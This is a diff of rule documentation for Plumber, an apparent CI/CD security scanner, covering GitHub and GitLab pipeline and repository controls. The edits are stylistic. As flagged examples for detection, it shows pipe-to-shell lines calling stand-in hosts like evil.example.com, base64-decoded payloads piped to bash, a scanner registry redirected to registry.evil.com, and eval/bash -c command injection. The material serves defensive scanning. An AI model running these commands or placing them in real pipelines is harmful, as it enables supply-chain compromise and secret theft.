         "Access levels: 0 = No one, 30 = Developer, 40 = Maintainer.",
         "Force push should almost always be disabled on production branches.",
       ],
@@ -1645,7 +1645,7 @@ branchMustBeProtected:
         "A protected-but-misconfigured branch creates a false sense of safety. Reviewers see the green check, the workflow runs, and the UI shows a protection rule, but a critical safeguard (force-push prevention, code-owner review, required checks) is disabled in practice.",
       remediation:
         "Update whichever source carries the offending setting (the classic rule, a Repository Ruleset, or an inherited Organization Ruleset) so the merged effective configuration matches `.plumber.yaml`. Each non-compliant setting is listed individually in Plumber's output so you know exactly what to change.",
-      badExample: `# GitHub repo settings — ❌ Protection too permissive
+      badExample: `# GitHub repo settings: ❌ Protection too permissive
 # Settings > Rules > Rulesets > \`main\` ruleset:
 #   Block force pushes: OFF        ← required by policy
 #   Require pull request reviews: ON
@@ -1661,7 +1661,7 @@ github:
       codeOwnerApprovalRequired: true
       minPullRequestReviews: 1`,
       badExampleCaption: "Ruleset exists but force-push is allowed and code-owner reviews are off.",
-      goodExample: `# GitHub repo settings — ✅ Settings match policy
+      goodExample: `# GitHub repo settings: ✅ Settings match policy
 # Settings > Rules > Rulesets > \`main\` ruleset:
 #   Block force pushes: ON
 #   Require pull request reviews: ON
@@ -1694,7 +1694,7 @@ github:
         "Non-compliant merge request settings can lead to unauthorized code changes and security vulnerabilities.",
       remediation:
         "Update the merge request settings to comply with your Policy controls by ensuring proper merge methods and merge options.",
-      badExample: `# GitLab project settings — ❌ Non-compliant MR settings
+      badExample: `# GitLab project settings: ❌ Non-compliant MR settings
 # Settings > Merge requests:
 #
 #   Merge method: Merge commit (policy requires: Fast-forward merge)
@@ -1704,7 +1704,7 @@ github:
 # These settings create merge commits that clutter history
 # and allow inconsistent commit messages.`,
       badExampleCaption: "MR settings use merge commits and don't enforce squashing, violating the policy.",
-      goodExample: `# GitLab project settings — ✅ Compliant MR settings
+      goodExample: `# GitLab project settings: ✅ Compliant MR settings
 # Settings > Merge requests:
 #
 #   Merge method: Fast-forward merge
@@ -1735,17 +1735,17 @@ github:
         "Missing components result in non-compliant and insecure pipeline configurations. For example, if your pipeline is missing a security scan component, vulnerabilities might go undetected.",
       remediation:
         "Include the missing GitLab catalog component in the CI/CD pipeline configuration of the project.",
-      badExample: `# .gitlab-ci.yml — ❌ Missing required SAST component
+      badExample: `# .gitlab-ci.yml: ❌ Missing required SAST component
 include:
   - component: gitlab.com/components/secret-detection/secret-detection@2.4.1
   # Missing: gitlab.com/components/sast/sast (required by policy)
 
-# .plumber.yaml — Requires both SAST and secret detection
+# .plumber.yaml: Requires both SAST and secret detection
 # pipelineMustIncludeComponent:
 #   enabled: true
 #   required: components/sast/sast AND components/secret-detection/secret-detection`,
       badExampleCaption: "The SAST component is required but missing from the pipeline.",
-      goodExample: `# .gitlab-ci.yml — ✅ All required components included
+      goodExample: `# .gitlab-ci.yml: ✅ All required components included
 include:
   - component: gitlab.com/components/sast/sast@1.5.2
   - component: gitlab.com/components/secret-detection/secret-detection@2.4.1`,
@@ -1753,7 +1753,7 @@ include:
       tips: [
         "Use expression syntax (`AND`/`OR`) in `required` for complex rules: `(sast AND secret-detection) OR full-security`.",
         "Alternatively, use `requiredGroups` with arrays for OR-of-ANDs logic.",
-        "The `include` must match the component path pattern — check your `.plumber.yaml` for the exact paths.",
+        "The `include` must match the component path pattern. Check your `.plumber.yaml` for the exact paths.",
       ],
       relatedCodes: ["ISSUE-409", "ISSUE-405"],
     },
@@ -1774,7 +1774,7 @@ include:
         "Overriding required components can lead to non-compliant and insecure pipelines. For example, overriding a security scan component might bypass mandatory security checks.",
       remediation:
         "Remove overrides from the project CI/CD configuration. If overrides are relevant, include them in the required component or create a new one.",
-      badExample: `# .gitlab-ci.yml — ❌ Overrides the SAST component's script
+      badExample: `# .gitlab-ci.yml: ❌ Overrides the SAST component's script
 include:
   - component: gitlab.com/components/sast/sast@1.5.2
 
@@ -1785,7 +1785,7 @@ sast:
   variables:
     SAST_EXCLUDED_PATHS: "**/*"`,
       badExampleCaption: "The SAST job is overridden, effectively disabling the security scan.",
-      goodExample: `# .gitlab-ci.yml — ✅ Uses component inputs, no overrides
+      goodExample: `# .gitlab-ci.yml: ✅ Uses component inputs, no overrides
 include:
   - component: gitlab.com/components/sast/sast@1.5.2
     inputs:
@@ -1819,7 +1819,7 @@ include:
         "Ignoring role quotas can lead to uncontrolled access to project resources, weakening security and governance policies. For example, if too many users are assigned as Owners or Maintainers, it increases the risk of unauthorized changes and security misconfigurations.",
       remediation:
         "Review and adjust the members' role assignments in the project to comply with the defined quotas. Ensure that only the necessary members have privileges.",
-      badExample: `# GitLab project members — ❌ Too many Maintainers
+      badExample: `# GitLab project members: ❌ Too many Maintainers
 # Settings > Members:
 #
 #   alice  → Owner
@@ -1828,7 +1828,7 @@ include:
 #   dave   → Maintainer
 #   eve    → Maintainer    ← 4 Maintainers (max allowed: 2)`,
       badExampleCaption: "The project has 4 maintainers, exceeding the allowed quota of 2.",
-      goodExample: `# GitLab project members — ✅ Quotas respected
+      goodExample: `# GitLab project members: ✅ Quotas respected
 # Settings > Members:
 #
 #   alice  → Owner
@@ -1862,13 +1862,13 @@ include:
         "Even specific version tags (e.g., `python:3.12.1`) can be reassigned to a different image. Digest pinning is the only way to guarantee the exact image content used in your pipeline, providing the strongest supply chain security.",
       remediation:
         "Replace the tag reference with a digest reference. You can find the digest using `docker inspect` or `crane digest`.",
-      badExample: `# .gitlab-ci.yml — ❌ Uses tag reference (not pinned by digest)
+      badExample: `# .gitlab-ci.yml: ❌ Uses tag reference (not pinned by digest)
 build:
   image: python:3.12.1
   script:
     - python setup.py build`,
       badExampleCaption: "Even specific version tags can be reassigned to a different image.",
-      goodExample: `# .gitlab-ci.yml — ✅ Pinned by SHA256 digest
+      goodExample: `# .gitlab-ci.yml: ✅ Pinned by SHA256 digest
 build:
   image: python@sha256:1c5313e4a18...f4b8e
   script:
@@ -1910,7 +1910,7 @@ controls:
         "**This is a critical security vulnerability.** When debug trace is enabled, every secret variable (API tokens, passwords, deployment keys) is printed in plain text in the job logs. These logs may be accessible to anyone with repository access.",
       remediation:
         "Remove `CI_DEBUG_TRACE` and `CI_DEBUG_SERVICES` from your pipeline configuration. These should only be used temporarily for local debugging and must never be committed.",
-      badExample: `# .gitlab-ci.yml — ❌ Debug trace enabled (CRITICAL)
+      badExample: `# .gitlab-ci.yml: ❌ Debug trace enabled (CRITICAL)
 variables:
   CI_DEBUG_TRACE: "true"    # Exposes ALL secrets in logs!
 
@@ -1921,7 +1921,7 @@ deploy:
   script:
     - deploy.sh`,
       badExampleCaption: "All secret variables will be printed in plain text in job logs.",
-      goodExample: `# .gitlab-ci.yml — ✅ Debug trace removed
+      goodExample: `# .gitlab-ci.yml: ✅ Debug trace removed
 variables:
   # CI_DEBUG_TRACE removed
 
@@ -1934,7 +1934,7 @@ deploy:
 #   - Add specific echo/print statements
 #   - Use 'set -x' for specific script sections only
 #   - Run a debug pipeline with limited access`,
-      goodExampleCaption: "No debug trace — secrets remain protected.",
+      goodExampleCaption: "No debug trace, so secrets remain protected.",
       tips: [
         "If you need to debug a CI job, use `set -x` in specific script lines instead of `CI_DEBUG_TRACE`.",
         "If debug trace was ever enabled, **rotate all secrets** that may have been exposed in logs.",
@@ -1957,7 +1957,7 @@ deploy:
         "Every secret the workflow can read becomes visible to anyone with `actions: read` on the repository, plus to anyone who can download the log artefact (GitHub retains logs for 90 days by default). The exposure window for organisation-wide secrets, deploy tokens, and OIDC-minted cloud credentials starts the moment the run completes and lasts as long as the log is retained.",
       remediation:
         "Remove `ACTIONS_STEP_DEBUG` and `ACTIONS_RUNNER_DEBUG` from every `env:` block in the workflow file (workflow-level, job-level, and step-level). For per-run diagnostics, set the variables in the GitHub UI under `Actions → Re-run with debug logging` so they apply to a single re-run and never get committed.",
-      badExample: `# .github/workflows/ci.yml — ❌ Runner debug logging committed
+      badExample: `# .github/workflows/ci.yml: ❌ Runner debug logging committed
 name: ci
 on: [push]
 env:
@@ -1968,7 +1968,7 @@ jobs:
     steps:
       - run: ./build.sh`,
       badExampleCaption: "Workflow-level env is merged into every job; secret-bearing steps print their values verbatim.",
-      goodExample: `# .github/workflows/ci.yml — ✅ No debug toggles in the workflow file
+      goodExample: `# .github/workflows/ci.yml: ✅ No debug toggles in the workflow file
 name: ci
 on: [push]
 jobs:
@@ -2013,7 +2013,7 @@ github:
         "An attacker can craft a branch name, MR title, or commit message to inject arbitrary commands into your pipeline. This is a direct path to secret exfiltration, source code theft, and supply chain compromise. Maps to OWASP CICD-SEC-1 (Insufficient Flow Control).",
       remediation:
         "Avoid passing user-controlled variables to commands that re-interpret input as shell code. Use the variable in a safe context (e.g., `echo`, environment variable assignment) or add the script line to `allowedPatterns` in `.plumber.yaml` if the usage is intentional and safe.",
-      badExample: `# .gitlab-ci.yml — ❌ Variables in shell re-interpretation contexts
+      badExample: `# .gitlab-ci.yml: ❌ Variables in shell re-interpretation contexts
 deploy:
   script:
     - eval "deploy --branch $CI_COMMIT_BRANCH"
@@ -2026,7 +2026,7 @@ release:
   script:
     - bash -c "tag=$CI_COMMIT_REF_NAME; push_release $tag"`,
       badExampleCaption: "User-controlled variables are passed to eval, sh -c, and bash -c, enabling command injection.",
-      goodExample: `# .gitlab-ci.yml — ✅ Variables used in safe contexts
+      goodExample: `# .gitlab-ci.yml: ✅ Variables used in safe contexts
 deploy:
   script:
     - deploy --branch "$CI_COMMIT_BRANCH"
@@ -2071,7 +2071,7 @@ release:
         "An attacker who can modify `.gitlab-ci.yml` could override variables like `SECURE_ANALYZERS_PREFIX` to point to a fake registry, or set `SAST_DISABLED: \"true\"` to silently disable security scanners. The pipeline still appears green, but no actual scanning occurs. This applies to any variable the organization considers controlled, not just security-related ones.",
       remediation:
         "Remove the variable from `.gitlab-ci.yml` (both global `variables:` and per-job `variables:` blocks) and set it in **GitLab CI/CD Settings > Variables** instead. Configure the list of controlled variables in `.plumber.yaml` under `pipelineMustNotOverrideJobVariables.variables`.",
-      badExample: `# .gitlab-ci.yml — ❌ Controlled variables defined in the YAML
+      badExample: `# .gitlab-ci.yml: ❌ Controlled variables defined in the YAML
 variables:
   SECURE_ANALYZERS_PREFIX: "registry.evil.com/scanners"
   SAST_DISABLED: "true"
@@ -2084,7 +2084,7 @@ build:
   script:
     - go build ./...`,
       badExampleCaption: "Controlled variables are redefined in .gitlab-ci.yml, bypassing CI/CD Settings.",
-      goodExample: `# .gitlab-ci.yml — ✅ No controlled variables in the YAML
+      goodExample: `# .gitlab-ci.yml: ✅ No controlled variables in the YAML
 variables:
   GOPROXY: "https://proxy.golang.org,direct"
 
@@ -2133,7 +2133,7 @@ build:
         "Weakened security jobs give a false sense of compliance. The pipeline appears to include security scanning, but the scans either never run, require manual intervention, or silently ignore failures. Maps to OWASP CICD-SEC-4 (Poisoned Pipeline Execution).",
       remediation:
         "Remove the override that weakens the security job. Security jobs should run automatically on every pipeline and block the pipeline on failure.",
-      badExample: `# .gitlab-ci.yml — ❌ Security jobs are weakened
+      badExample: `# .gitlab-ci.yml: ❌ Security jobs are weakened
 include:
   - template: Security/SAST.gitlab-ci.yml
   - template: Security/Secret-Detection.gitlab-ci.yml
@@ -2151,13 +2151,13 @@ secret_detection:
 container_scanning:
   when: manual`,
       badExampleCaption: "Security jobs are present but neutralized through allow_failure, rules override, and when: manual.",
-      goodExample: `# .gitlab-ci.yml — ✅ Security jobs run as intended
+      goodExample: `# .gitlab-ci.yml: ✅ Security jobs run as intended
 include:
   - template: Security/SAST.gitlab-ci.yml
   - template: Security/Secret-Detection.gitlab-ci.yml
   - template: Security/Container-Scanning.gitlab-ci.yml
 
-# No local overrides — security jobs run as designed by the templates
+# No local overrides: security jobs run as designed by the templates
 # Customization is done through CI/CD variables:
 variables:
   SAST_EXCLUDED_PATHS: "test/**"
@@ -2200,10 +2200,10 @@ variables:
       description:
         "A security-scan job in a GitHub Actions workflow is neutralized via `continue-on-error: true`, a narrow `if:` condition that never triggers, or a trigger filter that effectively skips it.",
       impact:
-        "A weakened security scan gives a false sense of compliance — the pipeline reports green, but the scan either never ran or its findings were silently ignored. Same OWASP CICD-SEC-4 pattern as on GitLab.",
+        "A weakened security scan gives a false sense of compliance: the pipeline reports green, but the scan either never ran or its findings were silently ignored. Same OWASP CICD-SEC-4 pattern as on GitLab.",
       remediation:
         "Remove the weakening pattern. Security scans should fail the pipeline, not pass with warnings.",
-      badExample: `# .github/workflows/codeql.yml — ❌ Weakened
+      badExample: `# .github/workflows/codeql.yml: ❌ Weakened
 jobs:
   analyze:
     runs-on: ubuntu-latest
@@ -2212,7 +2212,7 @@ jobs:
     steps:
       - uses: github/codeql-action/analyze@v3`,
       badExampleCaption: "Findings are ignored, and the job only runs on manual dispatch.",
-      goodExample: `# .github/workflows/codeql.yml — ✅ Runs on every push, fails on findings
+      goodExample: `# .github/workflows/codeql.yml: ✅ Runs on every push, fails on findings
 jobs:
   analyze:
     runs-on: ubuntu-latest
@@ -2250,10 +2250,10 @@ github:
       description:
         "A CI/CD job downloads or inline-executes code without any integrity check. Detects classic supply-chain patterns (`curl | bash`, `wget | sh`, download-then-exec on the same line, redirect-then-exec) plus the Megalodon-style obfuscated payload (`echo \"<base64>\" | base64 -d | bash`) and any generic `<cmd> | <shell>` chain. Maps to OWASP CICD-SEC-3 (Dependency Chain Abuse) and CICD-SEC-8 (Ungoverned Usage of 3rd Party Services).",
       impact:
-        "An attacker who compromises the remote URL — or who can inject an obfuscated inline payload into the pipeline — runs arbitrary code with the runner's `$CI_JOB_TOKEN`, deploy keys, custom CI/CD variables and any masked secrets in scope. The blast radius is the union of every secret the job can read; a single retag of the upstream script enough to exfiltrate the lot.",
+        "An attacker who compromises the remote URL, or who can inject an obfuscated inline payload into the pipeline, runs arbitrary code with the runner's `$CI_JOB_TOKEN`, deploy keys, custom CI/CD variables and any masked secrets in scope. The blast radius is the union of every secret the job can read; a single retag of the upstream script is enough to exfiltrate the lot.",
       remediation:
         "Download to a file and verify a checksum or signature on the same line before execution (`sha256sum -c`, `gpg --verify`, `cosign verify` / `verify-blob`). Or vendor the script in-tree under version control. For trusted internal hosts, declare the URL pattern in `trustedUrls` (host-precise glob match).",
-      badExample: `# .gitlab-ci.yml — ❌ Six patterns the rule catches
+      badExample: `# .gitlab-ci.yml: ❌ Six patterns the rule catches
 pipe_to_shell:
   image: alpine:3.19
   script:
@@ -2283,8 +2283,8 @@ generic_local_pipe:
   image: alpine:3.19
   script:
     - cat /tmp/payload.sh | sh`,
-      badExampleCaption: "Each pattern downloads or inline-decodes code and runs it on the same line — the rule operates per-script-line, so the unsafe download and the shell must both be on one line for a finding to fire.",
-      goodExample: `# .gitlab-ci.yml — ✅ Three ways to clear the finding
+      badExampleCaption: "Each pattern downloads or inline-decodes code and runs it on the same line. The rule operates per-script-line, so the unsafe download and the shell must both be on one line for a finding to fire.",
+      goodExample: `# .gitlab-ci.yml: ✅ Three ways to clear the finding
 vendored_script:
   image: alpine:3.19
   script:
@@ -2303,7 +2303,7 @@ signature_verified:
     # cosign verify-blob on the same line works the same way; gpg --verify too.
     - curl -sSL https://example.com/install.sh -o install.sh && cosign verify-blob --signature install.sig install.sh && bash install.sh
 
-# .plumber.yaml — exempt a known-good internal host
+# .plumber.yaml: exempt a known-good internal host
 # gitlab:
 #   controls:
 #     pipelineMustNotExecuteUnverifiedScripts:
@@ -2314,10 +2314,10 @@ signature_verified:
       tips: [
         "Recognised integrity checks (any on the same line as the download): `sha256sum`, `sha512sum`, `sha1sum`, `shasum`, `gpg --verify`, `cosign verify`, `cosign verify-blob`.",
         "Verification is per-line: the keyword must be on the same line as the unsafe pattern, not on a separate `script:` entry. `curl … && sha256sum -c … && bash …` works; splitting them across three array items does not.",
-        "The verification check itself ignores keywords inside quoted strings — `echo \"should sha256sum first\" && curl evil | bash` does NOT bypass detection.",
-        "Pipe-to-shell substrings inside a quoted string (`echo \"Install with curl … | bash\"`) are documentation, not execution — they do not fire.",
+        "The verification check itself ignores keywords inside quoted strings: `echo \"should sha256sum first\" && curl evil | bash` does NOT bypass detection.",
+        "Pipe-to-shell substrings inside a quoted string (`echo \"Install with curl … | bash\"`) are documentation, not execution, so they do not fire.",
         "Heredoc-to-shell with no download on the line (`cat <<EOF | bash`) is operator-authored, in-tree content. Any unsafe download inside the heredoc body still fires on its own script line.",
-        "A leading `echo`/`printf` piping a local variable into an interpreter (`echo \"$VAR\" | python3 -c …`) is in-pipeline data, not a download, so it does not fire. The exemption is voided by any `curl`/`wget`/`base64` anywhere on the line — including one hidden inside a quoted command substitution (`echo \"$(curl evil)\" | bash` still fires), so quoting a fetch does not evade the check.",
+        "A leading `echo`/`printf` piping a local variable into an interpreter (`echo \"$VAR\" | python3 -c …`) is in-pipeline data, not a download, so it does not fire. The exemption is voided by any `curl`/`wget`/`base64` anywhere on the line, including one hidden inside a quoted command substitution (`echo \"$(curl evil)\" | bash` still fires), so quoting a fetch does not evade the check.",
         "`trustedUrls` is host-precise: `https://example.com/*` does NOT match `https://evil.example.com/*`.",
         "Consider vendoring external scripts into your repository for full control over their content; use a trusted package manager (apt, brew, pip) instead of raw script downloads when possible.",
       ],
@@ -2334,10 +2334,10 @@ signature_verified:
       description:
         "A workflow `run:` step downloads or inline-executes code without any integrity check. Flags direct pipe-to-shell chains (`curl | bash`, `wget | sh`, `curl | python`, and any `<command> | <shell>` pattern), download-then-execute (`curl -o script.sh … && bash script.sh`), redirect-then-execute (`curl … > install.sh; sh install.sh`), and Megalodon-style obfuscated payloads (`echo \"<base64>\" | base64 -d | bash`) written directly in the workflow. Maps to OWASP CICD-SEC-3 (Dependency Chain Abuse) and CICD-SEC-8 (Ungoverned Usage of 3rd Party Services).",
       impact:
-        "An attacker who compromises the remote URL — or who can inject an obfuscated inline payload into a workflow — runs arbitrary code with the job's `GITHUB_TOKEN`, every secret the workflow can read, OIDC trust relationships, deploy keys, package-registry credentials. The Megalodon vector specifically targets GitHub Actions because the privileged context is uniform across thousands of repos.",
+        "An attacker who compromises the remote URL, or who can inject an obfuscated inline payload into a workflow, runs arbitrary code with the job's `GITHUB_TOKEN`, every secret the workflow can read, OIDC trust relationships, deploy keys, package-registry credentials. The Megalodon vector specifically targets GitHub Actions because the privileged context is uniform across thousands of repos.",
       remediation:
         "Vendor scripts into the repository, or download to a file and verify a checksum / signature on the same line before execution. For trusted internal hosts, declare the URL pattern in `trustedUrls` (host-precise glob match). Heredoc-to-shell with no download on the line is treated as in-tree operator-authored content and does not fire.",
-      badExample: `# .github/workflows/setup.yml — ❌ Five patterns this rule catches
+      badExample: `# .github/workflows/setup.yml: ❌ Five patterns this rule catches
 jobs:
   pipe_to_shell:
     runs-on: ubuntu-latest
@@ -2365,8 +2365,8 @@ jobs:
       - run: |
           curl https://evil.example.com/payload | bash <<EOF
           EOF`,
-      badExampleCaption: "Each pattern downloads or inline-decodes code and runs it without any integrity check — exactly the attack surface Megalodon exploited.",
-      goodExample: `# .github/workflows/setup.yml — ✅ Three ways to clear the finding
+      badExampleCaption: "Each pattern downloads or inline-decodes code and runs it without any integrity check. This is exactly the attack surface Megalodon exploited.",
+      goodExample: `# .github/workflows/setup.yml: ✅ Three ways to clear the finding
 jobs:
   vendored_script:
     runs-on: ubuntu-latest
@@ -2390,7 +2390,7 @@ jobs:
           cosign verify-blob --signature install.sig install.sh
           bash install.sh
 
-# .plumber.yaml — exempt a known-good internal host
+# .plumber.yaml: exempt a known-good internal host
 # github:
 #   controls:
 #     pipelineMustNotExecuteUnverifiedScripts:
@@ -2402,10 +2402,10 @@ jobs:
         "Recognised integrity checks (any on the same line as the download): `sha256sum`, `sha512sum`, `sha1sum`, `shasum`, `gpg --verify`, `cosign verify`, `cosign verify-blob`.",
         "The verification check ignores keywords inside quoted strings, so `echo \"should sha256sum first\" && curl evil | bash` does NOT bypass detection.",
         "`trustedUrls` is host-precise: `https://example.com/*` does NOT match `https://evil.example.com/*`.",
-        "Pipe-to-shell substrings inside a quoted string (`echo \"Install with curl … | bash\"`) are documentation, not execution — they do not fire.",
+        "Pipe-to-shell substrings inside a quoted string (`echo \"Install with curl … | bash\"`) are documentation, not execution, so they do not fire.",
         "Heredoc-to-shell with no download on the line (`cat <<EOF | bash`) is operator-authored, in-tree content. Any unsafe download inside the heredoc body still fires on its own script line.",
-        "A leading `echo`/`printf` piping in-workflow data into an interpreter (`echo \"$NEEDS_CONTEXT\" | python3 -c …`) is local data, not a download — it does not fire unless `curl`/`wget`/`base64` is also on the line.",
-        "Inline payloads on `pull_request_target` workflows are especially dangerous — combine ISSUE-411 with ISSUE-802 (dangerous-triggers) for the full Megalodon defence.",
+        "A leading `echo`/`printf` piping in-workflow data into an interpreter (`echo \"$NEEDS_CONTEXT\" | python3 -c …`) is local data, not a download. It does not fire unless `curl`/`wget`/`base64` is also on the line.",
+        "Inline payloads on `pull_request_target` workflows are especially dangerous. Combine ISSUE-411 with ISSUE-802 (dangerous-triggers) for the full Megalodon defence.",
       ],
       relatedCodes: ["ISSUE-207", "ISSUE-802", "ISSUE-703"],
     },
@@ -2427,7 +2427,7 @@ jobs:
         "Docker-in-Docker in privileged mode grants near-root access to the host. An attacker (or a compromised dependency) can escape the container, list and inspect other containers on the runner, read volumes mounted by other CI jobs (potentially containing secrets), and probe the runner's internal network.",
       remediation:
         "Replace Docker-in-Docker with a rootless container build tool. Kaniko builds container images inside a container without requiring a Docker daemon or privileged mode.",
-      badExample: `# .gitlab-ci.yml — ❌ Uses Docker-in-Docker service
+      badExample: `# .gitlab-ci.yml: ❌ Uses Docker-in-Docker service
 build-image:
   image: docker:27
   services:
@@ -2439,7 +2439,7 @@ build-image:
     - docker build -t $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA .
     - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA`,
       badExampleCaption: "This job runs a Docker daemon inside the CI container, requiring privileged mode on the runner.",
-      goodExample: `# .gitlab-ci.yml — ✅ Uses Kaniko (no privileged mode needed)
+      goodExample: `# .gitlab-ci.yml: ✅ Uses Kaniko (no privileged mode needed)
 build-image:
   image:
     name: gcr.io/kaniko-project/executor:v1.23.2-debug
@@ -2478,7 +2478,7 @@ build-image:
         "A DinD service runs a full Docker daemon inside the job container. On shared self-hosted runners this means a compromised job can list other containers, mount their volumes, and exfiltrate secrets across jobs.",
       remediation:
         "Replace the DinD service with a rootless container builder. `docker/build-push-action` works without DinD by using BuildKit; Kaniko is another drop-in replacement.",
-      badExample: `# .github/workflows/image.yml — ❌ Docker-in-Docker service
+      badExample: `# .github/workflows/image.yml: ❌ Docker-in-Docker service
 jobs:
   build:
     runs-on: [self-hosted, privileged]
@@ -2490,7 +2490,7 @@ jobs:
       - uses: actions/checkout@v4
       - run: docker build -t myimg .`,
       badExampleCaption: "The job depends on a privileged DinD service.",
-      goodExample: `# .github/workflows/image.yml — ✅ BuildKit via docker/build-push-action
+      goodExample: `# .github/workflows/image.yml: ✅ BuildKit via docker/build-push-action
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -2510,7 +2510,7 @@ github:
       enabled: true`,
       goodExampleCaption: "BuildKit runs without a privileged daemon and is the GitHub-recommended path.",
       tips: [
-        "If DinD is unavoidable (rare on GitHub-hosted runners), use Kaniko or Buildah instead — both run rootless.",
+        "If DinD is unavoidable (rare on GitHub-hosted runners), use Kaniko or Buildah instead; both run rootless.",
         "Pair with ISSUE-413 to catch insecure daemon configuration when DinD is actually present.",
       ],
       relatedCodes: ["ISSUE-413", "ISSUE-101"],
@@ -2533,7 +2533,7 @@ github:
         "Without TLS, all communication between the CI job and the Docker daemon is in plaintext. On shared infrastructure, this allows network-level eavesdropping, man-in-the-middle attacks, and Docker API command injection by other containers on the same network.",
       remediation:
         "If Docker-in-Docker is required, do not set `DOCKER_TLS_CERTDIR` to an empty string and use `tcp://docker:2376` (TLS) instead of `tcp://docker:2375` (plaintext). Prefer Kaniko or Buildah to avoid this pattern entirely.",
-      badExample: `# .gitlab-ci.yml — ❌ DinD with TLS disabled
+      badExample: `# .gitlab-ci.yml: ❌ DinD with TLS disabled
 build-image:
   image: docker:27
   services:
@@ -2545,7 +2545,7 @@ build-image:
     - docker build -t $CI_REGISTRY_IMAGE .
     - docker push $CI_REGISTRY_IMAGE`,
       badExampleCaption: "TLS is disabled, exposing all Docker API traffic in plaintext.",
-      goodExample: `# .gitlab-ci.yml — ✅ DinD with TLS enabled (if DinD is truly required)
+      goodExample: `# .gitlab-ci.yml: ✅ DinD with TLS enabled (if DinD is truly required)
 build-image:
   image: docker:27
   services:
@@ -2586,7 +2586,7 @@ build-image:
         "Without TLS, the workflow talks to the Docker daemon in plaintext over the runner's internal network. Another job on the same self-hosted runner can intercept the traffic and inject Docker API commands.",
       remediation:
         "If DinD must stay, use the TLS port 2376 and let DinD generate the certs (`DOCKER_TLS_CERTDIR=/certs`). The better fix is to remove DinD entirely (see ISSUE-412).",
-      badExample: `# .github/workflows/image.yml — ❌ TLS disabled
+      badExample: `# .github/workflows/image.yml: ❌ TLS disabled
 jobs:
   build:
     runs-on: [self-hosted]
@@ -2601,7 +2601,7 @@ jobs:
     steps:
       - run: docker build -t myimg .`,
       badExampleCaption: "Plaintext API traffic between job and daemon on the runner network.",
-      goodExample: `# .github/workflows/image.yml — ✅ TLS enabled (or, better, no DinD)
+      goodExample: `# .github/workflows/image.yml: ✅ TLS enabled (or, better, no DinD)
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -2634,7 +2634,7 @@ jobs:
         "Ignoring role quotas can lead to uncontrolled access to project resources, weakening security and governance policies. For example, if too many users are assigned as Owners or Maintainers, it increases the risk of unauthorized changes and security misconfigurations.",
       remediation:
         "Review and adjust the members' role assignments in the group to comply with the defined quotas. Ensure that only the necessary members have privileges.",
-      badExample: `# GitLab group members — ❌ Too many Owners
+      badExample: `# GitLab group members: ❌ Too many Owners
 # Group > Members:
 #
 #   alice  → Owner
@@ -2642,7 +2642,7 @@ jobs:
 #   carol  → Owner
 #   dave   → Owner    ← 4 Owners (max allowed: 2)`,
       badExampleCaption: "The group has 4 owners, exceeding the allowed quota of 2.",
-      goodExample: `# GitLab group members — ✅ Quotas respected
+      goodExample: `# GitLab group members: ✅ Quotas respected
 # Group > Members:
 #
 #   alice  → Owner
@@ -2651,7 +2651,7 @@ jobs:
 #   dave   → Maintainer  ← Downgraded to meet quota`,
       goodExampleCaption: "Group member roles are adjusted to comply with the defined quota.",
       tips: [
-        "Group owners inherit owner access to all projects in the group — limit this role to trusted admins.",
+        "Group owners inherit owner access to all projects in the group. Limit this role to trusted admins.",
         "Use subgroups to apply different access policies to different teams.",
         "Regularly review group membership when team members change roles or leave the organization.",
       ],
@@ -2671,10 +2671,10 @@ jobs:
       description:
         "A workflow step references a third-party action by a mutable ref (tag like `v4` or branch like `main`) instead of a 40-character commit SHA.",
       impact:
-        "Tag and branch refs are mutable. The March 2025 `tj-actions/changed-files` compromise (CVE-2025-30066) retagged a stable version to point at malicious code that exfiltrated repo secrets from every CI run consuming the action — and there were thousands.",
+        "Tag and branch refs are mutable. The March 2025 `tj-actions/changed-files` compromise (CVE-2025-30066) retagged a stable version to point at malicious code that exfiltrated repo secrets from every CI run consuming the action, and there were thousands of them.",
       remediation:
         "Replace each `uses: owner/repo@vX` with `uses: owner/repo@<40-char-sha>  # vX.Y.Z`. Use Dependabot or Renovate to bump the SHA when upstream releases.",
-      badExample: `# .github/workflows/test.yml — ❌ Mutable refs everywhere
+      badExample: `# .github/workflows/test.yml: ❌ Mutable refs everywhere
 jobs:
   test:
     runs-on: ubuntu-latest
@@ -2683,7 +2683,7 @@ jobs:
       - uses: tj-actions/changed-files@v45
       - uses: some-third-party/action@main`,
       badExampleCaption: "Any of these tags can be moved upstream and start serving different code.",
-      goodExample: `# .github/workflows/test.yml — ✅ Pinned by SHA
+      goodExample: `# .github/workflows/test.yml: ✅ Pinned by SHA
 jobs:
   test:
     runs-on: ubuntu-latest
@@ -2692,7 +2692,7 @@ jobs:
       - uses: tj-actions/changed-files@cc733854b1f224978ef800d29e4709d5ee2883e4 # v46.0.5
       - uses: some-third-party/action@a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4 # v2.1.0
 
-# .plumber.yaml — opt in + skip first-party actions
+# .plumber.yaml: opt in + skip first-party actions
 github:
   controls:
     actionsMustBePinnedByCommitSha:
@@ -2701,7 +2701,7 @@ github:
       goodExampleCaption: "Every `uses:` carries a full SHA; the trailing comment names the release.",
       tips: [
         "List `actions` and `github` under `trustedOwners` to skip the rule for first-party GitHub-owned actions.",
-        "Local actions (`uses: ./.github/actions/foo`) are always exempt — they live in the same repo.",
+        "Local actions (`uses: ./.github/actions/foo`) are always exempt because they live in the same repo.",
         "Pair with ISSUE-702–115 for a complete supply-chain ruleset (archived repos, impostor SHAs, stale pins, etc.).",
       ],
       relatedCodes: ["ISSUE-702", "ISSUE-707", "ISSUE-708", "ISSUE-709", "ISSUE-703"],
@@ -2721,17 +2721,17 @@ github:
       description:
         "A workflow step uses a third-party action (`uses: owner/repo@ref`) whose upstream repository is archived on GitHub. Plumber scans committed `.github/workflows/*.{yml,yaml}` only, queries `GET /repos/{owner}/{repo}` for the `archived` flag, and caches one result per `owner/repo` (not per ref). Requires `gh auth login` or `GH_TOKEN`; without authentication the control abstains and emits no finding.",
       impact:
-        "Archived repositories don't receive security fixes. Any vulnerability discovered after the archive date stays open forever — but the action keeps running inside your workflow with whatever permissions you grant it. Pinning by SHA does not save the caller either: the last maintainer (or whoever later acquires the namespace) can still push new code under the same repository name.",
